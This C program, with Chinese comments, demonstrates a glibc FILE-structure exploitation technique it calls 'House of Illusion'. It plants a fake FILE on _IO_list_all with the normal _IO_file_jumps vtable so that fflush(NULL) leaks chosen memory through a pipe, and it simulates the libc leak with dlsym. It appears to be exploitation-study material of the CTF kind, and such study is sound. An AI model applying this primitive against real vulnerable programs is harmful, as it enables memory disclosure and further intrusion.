#define _GNU_SOURCE

/*
 * House of Illusion 使用正常 _IO_file_jumps 输出内存，适用于 2.23～2.43。
 *
 * 底层效果：write(fd, secret, length)，因此从漏洞视角看是任意地址读。
 * 输入原语：已知 libc 地址，并能让 _IO_list_all 指向可控的 fake FILE。
 */

#include <assert.h>
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define IO_CURRENTLY_PUTTING 0x0800
#define IO_IS_APPENDING 0x1000
#define IO_LINKED 0x0080

struct fake_file_plus {
    FILE file;
    const void *vtable;
};

int main(void)
{
    static char secret[] = "ILLUSION:MEMORY-TO-FD";
    char received[sizeof(secret)] = {0};
    char lock[64] = {0};
    struct fake_file_plus fake;
    int pipe_fd[2];

    memset(&fake, 0, sizeof(fake));

    /* dlsym 只代替题目中的 libc 泄漏和符号偏移。 */
    void **io_list_all = dlsym(RTLD_DEFAULT, "_IO_list_all");
    void *file_jumps = dlsym(RTLD_DEFAULT, "_IO_file_jumps");
    assert(io_list_all != NULL && file_jumps != NULL);

    void *saved_list = *io_list_all;

    /* pipe 的写端作为 fake FILE 的输出 fd，读端用于验证泄漏内容。 */
    assert(pipe(pipe_fd) == 0);

    fake.file._lock = (void *)lock;
    fake.file._chain = NULL;
    fake.file._mode = 0;
    fake.file._flags = IO_LINKED | IO_CURRENTLY_PUTTING | IO_IS_APPENDING;
    fake.file._fileno = pipe_fd[1];

    /* [_IO_write_base, _IO_write_ptr) 就是希望泄漏的内存区间。 */
    fake.file._IO_write_base = secret;
    fake.file._IO_write_ptr = secret + sizeof(secret);
    fake.file._IO_write_end = secret + sizeof(secret);

    /* read_end 等于 write_base，避免对 pipe 执行 lseek。 */
    fake.file._IO_read_end = secret;

    fake.file._IO_buf_base = secret;
    fake.file._IO_buf_end = secret + sizeof(secret);

    /* 使用正常合法 vtable，不移动表内槽位。 */
    fake.vtable = file_jumps;

    /* 漏洞模拟：把 fake FILE 放进全局链表并触发 flush。 */
    *io_list_all = &fake;
    fflush(NULL);
    *io_list_all = saved_list;

    close(pipe_fd[1]);
    assert(read(pipe_fd[0], received, sizeof(received)) == sizeof(received));
    close(pipe_fd[0]);

    assert(memcmp(received, secret, sizeof(secret)) == 0);
    printf("[+] Illusion 任意读成功\n");
    return 0;
}
